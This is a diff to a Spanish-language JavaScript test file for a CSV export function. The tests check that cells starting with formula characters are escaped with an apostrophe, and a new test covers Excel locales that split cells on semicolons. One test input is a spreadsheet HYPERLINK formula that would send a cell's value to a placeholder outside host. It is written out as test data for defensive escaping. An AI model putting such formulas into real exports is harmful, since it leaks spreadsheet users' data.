@@ -18,6 +18,11 @@ describe("CSV", () => {
     expect(body.slice(1).split("\r\n").slice(1, 4)).toEqual([`"'=HYPERLINK(""https://x/?""&C2;""ver"")",-520.00`, "'+51 999,-3", "'@x,Ana"])
   })
 
+  it("en un Excel que separa por «;», lo que sigue al «;» tampoco empieza como fórmula", () => {
+    const body = toCsv(["Concepto"], [["Taxi;=HYPERLINK(1)"], ["Luz;-agua"], ["Ana; Luis"]])
+    expect(body.slice(1).split("\r\n").slice(1, 4)).toEqual(["Taxi;'=HYPERLINK(1)", "Luz;'-agua", "Ana; Luis"])
+  })
+
   it("el nombre del archivo, sin tildes ni signos, con su periodo", () => {
     expect(csvFileName("Deuda de más de 30 días", "2026-09")).toBe("deuda-de-mas-de-30-dias-2026-09.csv")
     expect(csvFileName("No vinieron, por profesional", "2026-09-10..2026-09-25")).toBe("no-vinieron-por-profesional-2026-09-10-a-2026-09-25.csv")
